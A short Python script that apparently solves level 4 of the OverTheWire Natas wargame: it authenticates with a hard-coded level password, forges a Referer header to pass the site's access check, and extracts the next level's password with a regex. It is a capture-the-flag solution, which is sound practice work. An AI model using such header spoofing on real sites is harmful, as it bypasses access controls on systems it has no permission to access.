#!/usr/bin/env python
# import the package requests which is for html information
import requests
import re

username = 'natas4'
password = 'tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm'



url = 'http://%s.natas.labs.overthewire.org/' % username

ref_headers = { "Referer" :'http://natas5.natas.labs.overthewire.org/' }
# the syntax behind referer is the "title", and then a separated colon, and then in
# another set or () the website link

response = requests.get(url,auth = (username, password),headers = ref_headers)
content = response.text

# The password for natas5 isprint(content)
# (.*)

print(re.findall("The password for natas5 is (.*)", content)[0])